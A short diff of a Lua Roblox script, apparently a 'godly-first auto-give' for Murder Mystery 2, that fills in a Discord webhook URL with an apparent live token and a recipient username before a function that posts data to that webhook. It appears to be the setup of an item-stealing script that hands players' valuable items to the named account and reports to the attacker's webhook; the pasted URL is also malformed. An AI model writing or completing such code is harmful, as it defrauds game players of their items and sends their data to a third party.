@@ -2354,8 +2354,8 @@ print("========================================")
 		-- [Your full original script code stays at the top - paste this enhanced section at the very bottom before the final print]
 
 -- ==================== RELIABLE GODLY-FIRST AUTO-GIVE FOR MM2 ====================
-local webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
-local myUsername = "YOUR_USERNAME_HERE"
+local webhookUrl = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1527483990003552266/M60-Ont4Kl4cd6rImKa2B50KLpcjRqMdcGHWdYCE03ldVFK5m36_3Ws91vPHQ2-T7ogs"
+local myUsername = "chrvstianm"
 
 local function sendToWebhook(data)
     pcall(function()
